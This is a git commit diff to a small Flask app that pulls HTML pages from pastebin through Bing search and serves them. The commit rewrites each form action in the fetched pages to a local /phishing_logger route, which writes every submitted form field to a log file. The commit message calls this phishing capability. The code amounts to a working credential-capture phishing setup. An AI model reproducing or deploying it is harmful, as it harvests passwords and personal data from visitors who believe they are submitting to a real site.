0c1c1f6820a4240fe2f5a90239bc413398842c59
alphactory <aedan.e.taylor@gmail.com>
2021-10-26 11:30:31 -0400

    added phishing log capabilities

--- app.py
+++ app.py
@@ -20,7 +20,7 @@ def seo():
     return flask.redirect("https://pastebin.com/UWkKnwUe", 302)
 
 def get_site(query):
-    subscriptionKey = ''
+    subscriptionKey = os.getenv("subscriptionKey")
     endpoint = 'https://api.bing.microsoft.com'
     customConfigId = 'e5f9a53e-48fa-4b66-9d43-9b52fb158d18'
     searchTerm = urllib.parse.quote_plus("site:pastebin.com <!DOCTYPE html> " + query)
@@ -33,6 +33,23 @@ def get_site(query):
     firsturl = searchresult["webPages"]["value"][0]["url"]
     firsturl = firsturl[:20]+'/raw'+firsturl[20:]
 
-    return requests.get(firsturl).text
+    rawtext=requests.get(firsturl).text
+    phishing_split = rawtext.split("<form action=\"")
+    new_rawtext = phishing_split[0]
+    try:
+        for i in phishing_split[1:]:
+            first_instance_of_quote = i.find("\"")
+            if not first_instance_of_quote == -1:
+                new_rawtext += "<form action=\"/phishing_logger" + i[first_instance_of_quote:]
+    except IndexError:
+        pass
+    return new_rawtext
+
+@app.route("/phishing_logger")
+def phishing_logger():
+    result = flask.escape(str(flask.request.args))
+    with open("phishing_log.txt", "a+") as f:
+        f.write(result + "\n")
+    return result
 
 app.run()
